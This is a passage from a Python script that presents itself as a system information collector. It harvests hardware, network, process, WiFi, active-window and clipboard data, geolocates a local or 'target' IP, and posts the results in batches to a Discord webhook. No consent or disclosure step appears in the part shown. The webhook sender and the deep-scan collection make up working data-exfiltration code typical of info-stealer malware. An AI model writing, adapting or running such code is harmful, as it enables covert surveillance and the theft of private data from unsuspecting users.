        ("Printers", getPrinters),
    ]
    
    if DEEP_SCAN:
        sections.extend([
            ("File System Scan", lambda: scanFilesAndFolders(SCAN_DEPTH, MAX_FILES_PER_DIR)),
            ("WiFi Networks", getWifiNetworks),
            ("Active Windows", getActiveWindows),
            ("Clipboard Content", getClipboardContent),
        ])
    
    for name, func in sections:
        try:
            print(f"📊 Collecting: {name}...")
            all_data[name.lower().replace(" ", "_")] = func()
        except Exception as e:
            all_data[name.lower().replace(" ", "_")] = {"error": str(e)}
            print(f"   ⚠️  Error: {str(e)}")
    
    all_data["collection_timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    print("\n✅ Collection complete!\n")
    return all_data

# ============================================================================
#                          IP TRACKING FUNCTIONS
# ============================================================================

def getMyIP(ext):
    """Get own IP with fallback"""
    url = f"https://ipapi.co/{ext}"
    try:
        response = get(url, timeout=10)
        if ext == "json":
            data = response.json()
            if 'error' not in data or not data.get('error'):
                return data
    except:
        pass
    
    # Fallback
    try:
        backup_url = "http://ip-api.com/json/"
        response = get(backup_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                "ip": data.get("query"),
                "city": data.get("city"),
                "region": data.get("regionName"),
                "country": data.get("country"),
                "country_code": data.get("countryCode"),
                "latitude": data.get("lat"),
                "longitude": data.get("lon"),
                "timezone": data.get("timezone"),
                "org": data.get("isp"),
                "postal": data.get("zip")
            }
    except:
        pass
    
    return {}

def getTargetIP(ip, ext):
    """Track target IP"""
    url = f"https://ipapi.co/{ip}/{ext}"
    try:
        response = get(url, timeout=10)
        if ext == "json":
            data = response.json()
            if 'error' not in data or not data.get('error'):
                return data
    except:
        pass
    
    try:
        backup_url = f"http://ip-api.com/json/{ip}"
        response = get(backup_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                "ip": data.get("query"),
                "city": data.get("city"),
                "region": data.get("regionName"),
                "country": data.get("country"),
                "latitude": data.get("lat"),
                "longitude": data.get("lon"),
                "org": data.get("isp")
            }
    except:
        pass
    
    return {}

# ============================================================================
#                       DISCORD WEBHOOK SENDER
# ============================================================================

def sendToWebhook(ip_data, system_data):
    """Send comprehensive data to Discord webhook in multiple batches"""
    if not webhook_url:
        print("❌ No webhook URL configured")
        return
    
    print("\n🔄 Sending data to Discord webhook...")
    
    try:
        # Batch 1: IP & Basic System
        batch1 = {
            "content": f"**📊 SYSTEM REPORT - {socket.gethostname()}**",
            "embeds": [
                {
                    "title": "🌎 External IP & Geolocation",
                    "description": "\n".join([f"**{k}:** {v}" for k, v in list(ip_data.items())[:15]]),
                    "color": 3447003
                }
            ]
        }
        
        if system_data.get("system_information"):
            sys_info = system_data["system_information"]
            batch1["embeds"].append({
                "title": "💻 System Information",
                "description": "\n".join([f"**{k}:** {v}" for k, v in list(sys_info.items())[:15]]),
                "color": 15844367
            })
        
        post(webhook_url, json=batch1, timeout=10)
        print("✅ Sent batch 1")
        time.sleep(1)
        
        # Batch 2: CPU, Memory, Disk
        batch2 = {"embeds": []}
        
        if system_data.get("cpu_information"):
            cpu = system_data["cpu_information"]
            batch2["embeds"].append({
                "title": "⚙️ CPU Information",
                "description": "\n".join([f"**{k}:** {v}" for k, v in list(cpu.items())[:12] if not isinstance(v, list)]),
                "color": 15158332
            })
        
        if system_data.get("memory_information"):
            mem = system_data["memory_information"].get("virtual_memory", {})
            batch2["embeds"].append({
                "title": "🧠 Memory Information",
                "description": "\n".join([f"**{k}:** {v}" for k, v in list(mem.items())[:10]]),
                "color": 10181046
            })
        
        if batch2["embeds"]:
            post(webhook_url, json=batch2, timeout=10)
            print("✅ Sent batch 2")
            time.sleep(1)
        
        # Batch 3: Network & Processes
        batch3 = {"embeds": []}
        
        if system_data.get("network_statistics"):
            net = system_data["network_statistics"]
            batch3["embeds"].append({
                "title": "🌐 Network Statistics",
                "description": "\n".join([f"**{k}:** {v}" for k, v in list(net.items())[:12] if not isinstance(v, dict)]),
                "color": 5763719
            })
        
        if system_data.get("process_information"):
            proc = system_data["process_information"].get("summary", {})
            batch3["embeds"].append({
                "title": "🔥 Process Summary",
                "description": "\n".join([f"**{k}:** {v}" for k, v in list(proc.items())[:10]]),
                "color": 16711680
            })
        
        if batch3["embeds"]:
            post(webhook_url, json=batch3, timeout=10)
            print("✅ Sent batch 3")
        
        # Save full data to file
        full_report_file = f"full_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(full_report_file, 'w') as f:
            json.dump({"ip_data": ip_data, "system_data": system_data}, f, indent=2)
        print(f"📄 Full report saved to: {full_report_file}")
        
    except Exception as e:
        print(f"❌ Webhook error: {e}")

# ============================================================================
#                           MAIN EXECUTION
# ============================================================================

if __name__ == "__main__":
    print("\n" + "="*80)
    print("🚀 ULTRA-COMPREHENSIVE SYSTEM INFO COLLECTOR")
    print("="*80)
    
    # Collect IP data
    ip_data = None
    if my_ip:
        print("\n📍 Getting your IP information...")
        ip_data = getMyIP(file_name_ext)
    elif ip_address != 1:
        print(f"\n📍 Tracking IP: {ip_address}...")
        ip_data = getTargetIP(ip_address, file_name_ext)
    
    # Collect system data
    system_data = collectAllInformation()
    
    # Send to webhook
    if ip_data and webhook_url:
        sendToWebhook(ip_data, system_data)
    
    # Save to file
    if not nooutput or file_name != "result.json":
        output_data = {
            "ip_information": ip_data,
            "system_information": system_data
        }
        with open(file_name, 'w') as f:
            json.dump(output_data, f, indent=2)
        print(f"\n💾 Data saved to: {file_name}")
    
    print("\n" + "="*80)
    print("✅ COLLECTION COMPLETE!")
    print("="*80 + "\n")

#
